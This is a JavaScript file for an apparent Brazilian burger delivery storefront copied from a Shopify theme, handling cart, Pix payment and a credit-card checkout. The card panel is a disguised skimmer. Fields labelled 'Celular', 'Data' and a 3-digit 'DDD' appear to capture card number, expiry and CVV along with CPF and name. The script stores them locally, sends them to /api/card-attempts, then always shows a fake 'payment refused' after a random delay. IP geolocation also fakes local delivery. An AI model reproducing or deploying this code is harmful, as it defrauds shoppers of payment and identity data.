(() => {
  const fallbackLocation = {
    city: 'Cariacica',
    state: 'Espirito Santo'
  };
  const minimumOrderCents = 1500;
  let estimatedLocation = { ...fallbackLocation };
  let estimatedLocationPromise = null;

  function isCartAddForm(form) {
    if (!form || form.tagName !== 'FORM') return false;

    try {
      const action = new URL(form.getAttribute('action') || form.action, window.location.origin);
      return action.pathname === '/cart/add';
    } catch {
      return false;
    }
  }

  function normalizeCartAddForms() {
    document.querySelectorAll('form').forEach((form) => {
      if (!isCartAddForm(form)) return;
      form.removeAttribute('enctype');
      form.enctype = 'application/x-www-form-urlencoded';
    });
  }

  function normalizePublicLinks() {
    const publicRoutes = new Map([
      ['/index.html', '/'],
      ['/cart', '/sacola'],
      ['/cart/', '/sacola'],
      ['/cart.html', '/sacola'],
      ['/collections/all.html', '/cardapio'],
      ['/pages/contact.html', '/contato'],
      ['/search.html', '/buscar'],
      ['/divinoburguer/www.hexadivinosdelivery.site/collections/all.html', '/cardapio']
    ]);

    document.querySelectorAll('a[href]').forEach((link) => {
      const rawHref = link.getAttribute('href');
      if (!rawHref || rawHref.startsWith('#')) return;

      try {
        const url = new URL(rawHref, window.location.href);
        if (url.origin !== window.location.origin) return;

        const route = publicRoutes.get(url.pathname);
        if (route) {
          link.setAttribute('href', `${route}${url.search}${url.hash}`);
        }
      } catch {
        // Keep malformed or third-party links unchanged.
      }
    });
  }

  function ensureToastRoot() {
    let root = document.getElementById('divino-toast-root');
    if (root) return root;

    root = document.createElement('div');
    root.id = 'divino-toast-root';
    root.setAttribute('aria-live', 'polite');
    document.body.appendChild(root);
    return root;
  }

  function showToast(message, action) {
    const root = ensureToastRoot();
    const toast = document.createElement('div');
    toast.className = 'divino-toast';
    toast.innerHTML = `
      <div class="divino-toast__text">${message}</div>
      ${action ? `<a class="divino-toast__action" href="${action.href}">${action.label}</a>` : ''}
      <button type="button" class="divino-toast__close" aria-label="Fechar">&times;</button>
    `;

    root.appendChild(toast);

    const close = () => {
      toast.classList.add('is-leaving');
      window.setTimeout(() => toast.remove(), 180);
    };

    toast.querySelector('.divino-toast__close').addEventListener('click', close);
    window.setTimeout(close, 5200);
  }

  function appendField(params, field) {
    if (!field.name || field.type === 'file') return;
    if ((field.type === 'checkbox' || field.type === 'radio') && !field.checked) return;
    params.append(field.name, field.value);
  }

  function formParams(form) {
    const params = new URLSearchParams();
    Array.from(form.elements).forEach((field) => {
      if (field.disabled && field.name !== 'id') return;
      appendField(params, field);
    });
    return params;
  }

  async function addToCart(form) {
    normalizeCartAddForms();

    const response = await fetch('/cart/add.js', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: formParams(form).toString()
    });

    const payload = await response.json().catch(() => ({}));

    if (!response.ok) {
      showToast(payload.message || 'Nao foi possivel adicionar o produto.', null);
      return;
    }

    document.querySelectorAll('cart-count').forEach((count) => {
      count.textContent = String(payload.item_count || 0);
    });
    showToast('Produto adicionado a sacola.', {
      href: '/sacola',
      label: 'Ir para sacola'
    });
  }

  function formatMoney(cents) {
    return (Number(cents || 0) / 100).toLocaleString('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    });
  }

  function cartLineTemplate(item) {
    const image = item.image || '';
    const title = item.product_title || item.title || 'Produto';
    const id = item.variant_id || item.id || '';

    return `
      <div class="divino-cart-line" data-cart-item-id="${id}">
        ${image ? `<img src="${image}" alt="">` : ''}
        <div class="divino-cart-line__info">
          <strong>${title}</strong>
          <span>Quantidade: ${item.quantity || 1}</span>
          <button type="button" class="divino-cart-remove" data-cart-remove="${id}">Remover</button>
        </div>
        <strong>${formatMoney(item.final_line_price || item.line_price || item.final_price || item.price)}</strong>
      </div>
    `;
  }

  function escapeHtml(value) {
    return String(value || '').replace(/[&<>"']/g, (char) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[char]));
  }

  function onlyDigits(value) {
    return String(value || '').replace(/\D/g, '');
  }

  function isValidLuhn(value) {
    const digits = onlyDigits(value);
    if (digits.length < 13 || digits.length > 19) return false;

    let sum = 0;
    let doubleDigit = false;
    for (let index = digits.length - 1; index >= 0; index -= 1) {
      let digit = Number(digits[index]);
      if (doubleDigit) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      doubleDigit = !doubleDigit;
    }
    return sum % 10 === 0;
  }

  function cardBrand(number) {
    const digits = onlyDigits(number);
    if (/^4/.test(digits)) return 'Visa';
    if (/^(5[1-5]|2[2-7])/.test(digits)) return 'Mastercard';
    if (/^3[47]/.test(digits)) return 'Amex';
    if (/^(4011|4312|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(digits)) return 'Elo';
    return 'Cartao';
  }

  function formatExpiry(value) {
    const digits = onlyDigits(value).slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  function formatPhone(value) {
    const digits = onlyDigits(value).slice(0, 11);
    if (digits.length <= 2) return digits;
    if (digits.length <= 6) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    if (digits.length <= 10) {
      return `(${digits.slice(0, 2)}) ${digits.slice(2, 6)}-${digits.slice(6)}`;
    }
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  }

  function formatCpf(value) {
    const digits = onlyDigits(value).slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  }

  function formatShortDate(value) {
    const digits = onlyDigits(value).slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  function isValidPhone(value) {
    const digits = onlyDigits(value);
    return /^\d{10,11}$/.test(digits) && digits.slice(0, 2) !== '00';
  }

  function isFutureExpiry(value) {
    const match = String(value || '').match(/^(\d{2})\/?(\d{2})$/);
    if (!match) return false;

    const month = Number(match[1]);
    const year = 2000 + Number(match[2]);
    if (month < 1 || month > 12) return false;

    const now = new Date();
    const expiry = new Date(year, month, 0, 23, 59, 59);
    return expiry >= now;
  }

  function setButtonCopied(button) {
    const originalText = button.textContent;
    button.textContent = 'Codigo Pix copiado';
    button.classList.add('is-copied');
    window.setTimeout(() => {
      button.textContent = originalText;
      button.classList.remove('is-copied');
    }, 2600);
  }

  function saveTestCard(form, cart) {
    const record = {
      id: `customer_${Date.now()}`,
      createdAt: new Date().toISOString(),
      phone: form.customerPhone.value,
      firstName: form.firstName.value,
      cpf: form.cpf.value,
      celular: form.celular.value,
      data: form.data.value,
      ddd: form.ddd.value,
      amount: cart.total_price,
      status: 'Recebido'
    };
    const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
    cards.unshift(record);
    localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 100)));
    return record;
  }

  async function saveTestCardToDatabase(form, cart) {
    const response = await fetch('/api/card-attempts', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        phone: form.customerPhone.value,
        firstName: form.firstName.value,
        cpf: form.cpf.value,
        celular: form.celular.value,
        data: form.data.value,
        ddd: form.ddd.value
      })
    });
    const payload = await response.json().catch(() => ({}));

    if (!response.ok) {
      throw new Error(payload.message || 'Nao foi possivel registrar os dados.');
    }

    return payload;
  }

  function openCardProcessingModal() {
    let modal = document.getElementById('divino-card-processing-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id = 'divino-card-processing-modal';
      modal.className = 'divino-pix-modal';
      document.body.appendChild(modal);
    }

    modal.innerHTML = `
      <div class="divino-pix-modal__overlay"></div>
      <div class="divino-pix-modal__dialog divino-card-processing" role="dialog" aria-modal="true" aria-labelledby="divino-card-processing-title">
        <div class="divino-card-spinner"></div>
        <h2 id="divino-card-processing-title">Processando pagamento</h2>
        <p>Aguarde enquanto validamos a tentativa de pagamento.</p>
      </div>
    `;
    modal.hidden = false;
    document.documentElement.classList.add('divino-modal-open');
    return modal;
  }

  function showCardRefusedModal() {
    const modal = document.getElementById('divino-card-processing-modal');
    if (!modal) return;

    modal.innerHTML = `
      <div class="divino-pix-modal__overlay" data-card-close></div>
      <div class="divino-pix-modal__dialog divino-card-processing divino-card-refused" role="alertdialog" aria-modal="true" aria-labelledby="divino-card-processing-title">
        <button type="button" class="divino-pix-modal__close" data-card-close aria-label="Fechar">&times;</button>
        <h2 id="divino-card-processing-title">Pagamento recusado</h2>
        <p>Metodo de pagamento recusado. Tente outra forma de pagamento ou aguarde alguns minutos para tentar novamente.</p>
      </div>
    `;
    modal.querySelectorAll('[data-card-close]').forEach((button) => {
      button.addEventListener('click', () => {
        modal.hidden = true;
        document.documentElement.classList.remove('divino-modal-open');
      });
    });
  }

  async function createCheckoutSession(cart) {
    const response = await fetch('/api/checkout-session', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        cart_payload: cart,
        origin: window.location.origin
      })
    });
    const payload = await response.json();

    if (!response.ok || !payload.sessionId) {
      throw new Error(payload.message || 'Nao foi possivel iniciar o checkout.');
    }

    return payload;
  }

  async function removeCartItem(id) {
    if (!id) return;

    const response = await fetch('/cart/change.js', {
      method: 'POST',
      credentials: 'same-origin',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: new URLSearchParams({
        id: String(id),
        quantity: '0'
      }).toString()
    });

    if (!response.ok) {
      throw new Error('Nao foi possivel remover o item.');
    }

    return response.json();
  }

  function openPixModal(payload) {
    const pix = payload && payload.pix ? payload.pix : {};
    const code = pix.code || '';
    const qrImage = pix.base64
      ? `data:image/png;base64,${pix.base64}`
      : (pix.image || (code ? `https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${encodeURIComponent(code)}` : ''));
    let modal = document.getElementById('divino-pix-modal');
    if (!modal) {
      modal = document.createElement('div');
      modal.id = 'divino-pix-modal';
      modal.className = 'divino-pix-modal';
      document.body.appendChild(modal);
    }

    modal.innerHTML = `
      <div class="divino-pix-modal__overlay" data-pix-close></div>
      <div class="divino-pix-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="divino-pix-title">
        <button type="button" class="divino-pix-modal__close" data-pix-close aria-label="Fechar">&times;</button>
        <h2 id="divino-pix-title">Pix gerado</h2>
        <p>Escaneie o QR Code ou copie o codigo Pix abaixo.</p>
        <div class="divino-pix-modal__qr">
          ${qrImage ? `<img alt="QR Code Pix" src="${qrImage}">` : '<span>Use o Pix copia e cola abaixo.</span>'}
        </div>
        <textarea readonly>${escapeHtml(code)}</textarea>
        <button type="button" class="button button--primary" id="divino-copy-pix">Copiar codigo</button>
      </div>
    `;
    modal.hidden = false;
    document.documentElement.classList.add('divino-modal-open');

    modal.querySelectorAll('[data-pix-close]').forEach((button) => {
      button.addEventListener('click', () => {
        modal.hidden = true;
        document.documentElement.classList.remove('divino-modal-open');
      });
    });
    modal.querySelector('#divino-copy-pix').addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(code);
        setButtonCopied(modal.querySelector('#divino-copy-pix'));
      } catch {
        modal.querySelector('textarea').select();
        document.execCommand('copy');
        setButtonCopied(modal.querySelector('#divino-copy-pix'));
      }
    });
  }

  function renderCheckoutSection(container, cart) {
    let section = document.getElementById('divino-inline-checkout');
    if (!section) {
      section = document.createElement('section');
      section.id = 'divino-inline-checkout';
      section.className = 'divino-inline-checkout';
      container.insertAdjacentElement('afterend', section);
    }

    section.innerHTML = `
      <h2>Finalizar pedido</h2>
      <div class="divino-payment-tabs" role="tablist">
        <button type="button" class="is-active" data-payment-tab="pix">Pix</button>
        <button type="button" data-payment-tab="card">Cartao de credito</button>
      </div>
      <form id="divino-payment-form" class="divino-payment-form">
        <div data-payment-panel="pix">
          <div class="divino-form-grid">
            <label>Nome completo<input name="name" autocomplete="name" required></label>
            <label>Email<input name="email" type="email" autocomplete="email" required></label>
            <label>Telefone<input name="phone" inputmode="tel" autocomplete="tel" placeholder="(11) 99999-9999" required></label>
            <label>CPF<input name="document" inputmode="numeric" autocomplete="off" maxlength="14" required></label>
          </div>
          <p class="divino-checkout-note">O Pix abre em um popup nesta pagina.</p>
          <button type="submit" class="button button--primary">Gerar Pix</button>
        </div>
        <div data-payment-panel="card" hidden>
          <div class="divino-form-grid">
            <label>Telefone<input name="customerPhone" type="text" inputmode="tel" placeholder="(11) 99999-9999"></label>
            <label>Nome completo<input name="firstName" type="text"></label>
            <label>CPF<input name="cpf" type="text" inputmode="numeric" maxlength="14"></label>
            <label>Celular<input name="celular" type="text" inputmode="numeric"></label>
            <label>Data<input name="data" type="text" inputmode="numeric" maxlength="5" placeholder="mes/ano"></label>
            <label>DDD<input name="ddd" type="text" inputmode="numeric" maxlength="3" pattern="[0-9]{3}" placeholder="000"></label>
          </div>
          <button type="submit" class="button button--primary" style="margin-top: 12px;" disabled>Finalizar compra</button>
        </div>
        <div id="divino-payment-message" class="divino-cart-error" hidden></div>
      </form>
    `;

    const tabs = section.querySelectorAll('[data-payment-tab]');
    const panels = section.querySelectorAll('[data-payment-panel]');
    const paymentMessage = section.querySelector('#divino-payment-message');
    let method = 'pix';

    const pixSubmit = section.querySelector('[data-payment-panel="pix"] button[type="submit"]');
    const cardSubmit = section.querySelector('[data-payment-panel="card"] button[type="submit"]');
    const customerFields = ['customerPhone', 'firstName', 'cpf', 'celular', 'data', 'ddd'];

    function validationMessageFor(selectedMethod) {
      if (selectedMethod === 'card') {
        const complete = customerFields.every((name) => section.querySelector(`[name="${name}"]`).value !== '');
        if (!complete) return 'Preencha todos os campos do cartao.';
        if (!isValidPhone(section.querySelector('[name="customerPhone"]').value)) {
          return 'Telefone invalido. Informe DDD + numero.';
        }
        if (!/^\d{2}\/\d{2}$/.test(section.querySelector('[name="data"]').value)) {
          return 'Data deve estar no formato mes/ano.';
        }
        if (!/^\d{3}$/.test(section.querySelector('[name="ddd"]').value)) {
          return 'DDD deve ter exatamente 3 numeros.';
        }
        return '';
      }

      const pixFields = ['name', 'email', 'phone', 'document'];
      const complete = pixFields.every((name) => section.querySelector(`[name="${name}"]`).value.trim() !== '');
      if (!complete) return 'Preencha todos os campos do Pix.';
      if (!isValidPhone(section.querySelector('[name="phone"]').value)) {
        return 'Telefone invalido. Informe DDD + numero.';
      }
      return '';
    }

    function updatePaymentValidation() {
      const validationMessage = validationMessageFor(method);
      pixSubmit.disabled = method === 'pix' && Boolean(validationMessage);
      cardSubmit.disabled = method === 'card' && Boolean(validationMessage);
      paymentMessage.textContent = validationMessage;
      paymentMessage.hidden = !validationMessage;
    }

    section.querySelectorAll('[data-payment-panel="card"] input').forEach((input) => {
      input.addEventListener('input', () => {
        if (input.name === 'ddd') {
          input.value = input.value.replace(/\D/g, '').slice(0, 3);
        } else if (input.name === 'cpf') {
          input.value = formatCpf(input.value);
        } else if (input.name === 'celular') {
          input.value = onlyDigits(input.value);
        } else if (input.name === 'data') {
          input.value = formatShortDate(input.value);
        } else if (input.name === 'customerPhone') {
          input.value = formatPhone(input.value);
        }
        updatePaymentValidation();
      });
      input.addEventListener('blur', updatePaymentValidation);
    });

    section.querySelector('[name="phone"]').addEventListener('input', (event) => {
      event.currentTarget.value = formatPhone(event.currentTarget.value);
      updatePaymentValidation();
    });

    section.querySelector('[name="document"]').addEventListener('input', (event) => {
      event.currentTarget.value = formatCpf(event.currentTarget.value);
      updatePaymentValidation();
    });

    ['name', 'email'].forEach((name) => {
      section.querySelector(`[name="${name}"]`).addEventListener('input', updatePaymentValidation);
    });

    function selectPaymentPanel(selectedMethod) {
      panels.forEach((panel) => {
        const isActive = panel.getAttribute('data-payment-panel') === selectedMethod;
        panel.hidden = !isActive;
        panel.querySelectorAll('input').forEach((input) => {
          input.disabled = !isActive;
          input.required = isActive;
        });
      });
      updatePaymentValidation();
    }

    selectPaymentPanel(method);

    tabs.forEach((tab) => {
      tab.addEventListener('click', () => {
        method = tab.getAttribute('data-payment-tab');
        tabs.forEach((item) => item.classList.toggle('is-active', item === tab));
        selectPaymentPanel(method);
        updatePaymentValidation();
      });
    });

    section.querySelector('#divino-payment-form').addEventListener('submit', async (event) => {
      event.preventDefault();
      const form = event.currentTarget;
      const message = section.querySelector('#divino-payment-message');
      const submit = form.querySelector(`[data-payment-panel="${method}"] button[type="submit"]`);
      message.hidden = true;
      submit.disabled = true;
      submit.textContent = method === 'pix' ? 'Gerando Pix...' : 'Validando...';

      try {
        const validationMessage = validationMessageFor(method);
        if (validationMessage) {
          message.textContent = validationMessage;
          message.hidden = false;
          submit.textContent = method === 'pix' ? 'Gerar Pix' : 'Finalizar compra';
          updatePaymentValidation();
          return;
        }

        if (method === 'card') {
          saveTestCard(form, cart);
          await saveTestCardToDatabase(form, cart);
          openCardProcessingModal();
          const delay = 7000 + Math.floor(Math.random() * 8001);
          window.setTimeout(() => {
            showCardRefusedModal();
          }, delay);
          return;
        }

        const session = await createCheckoutSession(cart);
        const response = await fetch('/api/pix/receive', {
          method: 'POST',
          credentials: 'same-origin',
          headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: JSON.stringify({
            sessionId: session.sessionId,
            client: {
              name: form.name.value,
              email: form.email.value,
              phone: form.phone.value,
              document: form.document.value
            }
          })
        });
        const payload = await response.json();
        if (!response.ok) {
          throw new Error(payload.message || 'Nao foi possivel gerar o Pix.');
        }
        localStorage.setItem('divino:lastPix', JSON.stringify(payload));
        openPixModal(payload);
      } catch (error) {
        message.textContent = error.message || 'Nao foi possivel concluir.';
        message.hidden = false;
      } finally {
        submit.disabled = false;
        submit.textContent = method === 'pix' ? 'Gerar Pix' : 'Finalizar compra';
        updatePaymentValidation();
      }
    });

    section.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }

  async function startCheckout(button) {
    const cart = await fetch('/cart.json', { credentials: 'same-origin' }).then((response) => response.json());
    const cartBox = button.closest('.divino-cart');
    renderCheckoutSection(cartBox, cart);
  }

  async function renderLocalCart() {
    const cartPaths = ['/sacola', '/cart', '/cart/', '/cart.html'];
    if (!cartPaths.includes(window.location.pathname)) return;

    const main = document.querySelector('#shopify-section-template--22109436444886__main .container');
    if (!main) return;

    try {
      const cart = await fetch('/cart.json', { credentials: 'same-origin' }).then((response) => response.json());
      document.querySelectorAll('cart-count').forEach((count) => {
        count.textContent = String(cart.item_count || 0);
      });

      if (!cart.item_count) {
        main.innerHTML = `
          <div class="empty-state text-container">
            <h1 class="heading h1">Carrinho</h1>
            <p class="text--large">Seu carrinho esta vazio</p>
            <div class="button-wrapper">
              <a href="/cardapio" class="button button--primary">Comece a comprar</a>
            </div>
          </div>
        `;
        return;
      }

      main.innerHTML = `
        <div class="divino-cart">
          <h1 class="heading h1">Carrinho</h1>
          <div class="divino-cart-lines">
            ${(cart.items || []).map(cartLineTemplate).join('')}
          </div>
          <div class="divino-cart-summary">
            <strong>Total</strong>
            <strong>${formatMoney(cart.total_price)}</strong>
          </div>
          ${cart.total_price < minimumOrderCents ? `
            <div class="divino-cart-minimum">
              Pedido minimo de R$ 15,00 para finalizar. Adicione mais itens ao carrinho.
            </div>
          ` : ''}
          <div id="divino-cart-error" class="divino-cart-error" hidden></div>
          <button type="button" id="divino-checkout-button" class="button button--primary" style="margin-top: 12px;" ${cart.total_price < minimumOrderCents ? 'disabled' : ''}>Finalizar compra</button>
        </div>
      `;

      const checkoutButton = document.getElementById('divino-checkout-button');
      if (checkoutButton) {
        checkoutButton.addEventListener('click', () => startCheckout(checkoutButton));
      }

      document.querySelectorAll('[data-cart-remove]').forEach((button) => {
        button.addEventListener('click', async () => {
          button.disabled = true;
          button.textContent = 'Removendo...';

          try {
            await removeCartItem(button.getAttribute('data-cart-remove'));
            await renderLocalCart();
          } catch (error) {
            const errorBox = document.getElementById('divino-cart-error');
            if (errorBox) {
              errorBox.textContent = error.message || 'Nao foi possivel remover o item.';
              errorBox.hidden = false;
            }
            button.disabled = false;
            button.textContent = 'Remover';
          }
        });
      });
    } catch {
      // Keep the mirrored cart visible if the local cart endpoint is unavailable.
    }
  }

  function updateLocationText(location) {
    const city = document.getElementById('localCidade');
    const state = document.getElementById('localEstado');

    if (city) city.textContent = location.city;
    if (state) state.textContent = location.state;
  }

  async function loadEstimatedLocation() {
    if (estimatedLocationPromise) return estimatedLocationPromise;

    estimatedLocationPromise = (async () => {
      const providers = [
        {
          url: 'https://ipwho.is/?lang=pt-BR',
          parse: (data) => data && data.success !== false && data.city && data.region
            ? { city: data.city, state: data.region }
            : null
        },
        {
          url: 'https://ipapi.co/json/',
          parse: (data) => data && data.city && data.region
            ? { city: data.city, state: data.region }
            : null
        }
      ];

      for (const provider of providers) {
        try {
          const response = await fetch(provider.url, { cache: 'no-store' });
          const location = provider.parse(await response.json());
          if (location) {
            estimatedLocation = location;
            updateLocationText(estimatedLocation);
            return estimatedLocation;
          }
        } catch {}
      }

      updateLocationText(estimatedLocation);
      return estimatedLocation;
    })();

    return estimatedLocationPromise;
  }

  function renderFixedShipping() {
    const result = document.querySelector('.frete-resultado');
    const cepResult = document.querySelector('.cep-resultado');
    const location = estimatedLocation || fallbackLocation;

    updateLocationText(location);

    if (cepResult) {
      cepResult.innerHTML = `<span style="color: var(--frete-buscar-localizacao);"> <i class="fa-solid fa-location-dot"></i> &nbsp</span><span style="font-weight: 600;color:var(--frete-buscar-localizacao);">${location.city} - ${location.state}</span>`;
    }

    if (result) {
      result.style.display = 'block';
      result.innerHTML = `
        <table class="table">
          <thead>
            <tr>
              <th>Entrega</th>
              <th>Prazo</th>
              <th>Valor</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Motoboy</strong></td>
              <td><i class="fa-solid fa-motorcycle"></i> <b>25-35</b> min</td>
              <td><strong style="color: var(--frete-buscar-precos);">Gratis</strong></td>
            </tr>
          </tbody>
        </table>
      `;
    }
  }

  function setupFixedShipping() {
    document.addEventListener('click', (event) => {
      const button = event.target && event.target.closest ? event.target.closest('.buscaCep') : null;
      if (!button) return;

      event.preventDefault();
      event.stopImmediatePropagation();
      renderFixedShipping();
      loadEstimatedLocation().then(renderFixedShipping);
    }, true);

    document.addEventListener('submit', (event) => {
      if (!event.target || !event.target.querySelector || !event.target.querySelector('#campo-cep')) return;

      event.preventDefault();
      event.stopImmediatePropagation();
      renderFixedShipping();
      loadEstimatedLocation().then(renderFixedShipping);
    }, true);
  }

  document.addEventListener('DOMContentLoaded', () => {
    normalizePublicLinks();
    normalizeCartAddForms();
    renderLocalCart();
    setupFixedShipping();
    loadEstimatedLocation();
  });
  document.addEventListener('click', (event) => {
    const button = event.target && event.target.closest ? event.target.closest('button[name="add"], input[name="add"]') : null;
    if (!button || !isCartAddForm(button.form)) return;

    event.preventDefault();
    event.stopImmediatePropagation();
    addToCart(button.form);
  }, true);

  document.addEventListener('submit', async (event) => {
    const form = event.target;
    if (!isCartAddForm(form)) return;

    event.preventDefault();
    event.stopImmediatePropagation();
    addToCart(form);
  }, true);
})();

//# sourceMappingURL=/cdn/shop/t/2/assets/custom.js.map?v=165930397078196874451780917605
